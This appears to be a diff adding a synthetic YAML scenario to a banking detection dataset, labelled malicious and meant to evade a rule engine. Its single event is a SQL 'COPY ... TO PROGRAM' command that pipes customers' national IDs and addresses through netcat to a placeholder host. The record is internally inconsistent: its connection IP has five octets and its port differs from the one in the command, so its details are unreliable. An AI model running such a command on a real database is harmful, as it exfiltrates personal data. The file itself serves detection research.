@@ -1,0 +1,30 @@
+scenario_id: gen_banking_70_copy_to_program_mal_1945m
+family_id: gen_banking_70_copy_to_program_fam_1945
+domain: banking
+time_of_day: '23:35'
+default_class: malicious
+rule_engine_relationship: malicious_false_negative
+sessions:
+- session_label: exfil
+  role: batch_etl_service
+  anchor: db
+  timing:
+    tempo: steady
+    step_gaps_seconds:
+    - 3.0
+  events:
+  - step_id: dump
+    sql: COPY (SELECT national_id, address FROM customers) TO PROGRAM 'nc warehouse-sync.datasink.example
+      443'
+    connects_to:
+      ip: 23.129.64.227.205
+      port: 9443
+matched_pair_id: gen_banking_70_copy_to_program_pair_1945
+matched_dimensions:
+  fixed:
+  - process_tree_shape
+  - syscall_sequence
+  - timing_pattern
+  - role
+  varied:
+  - sql_content
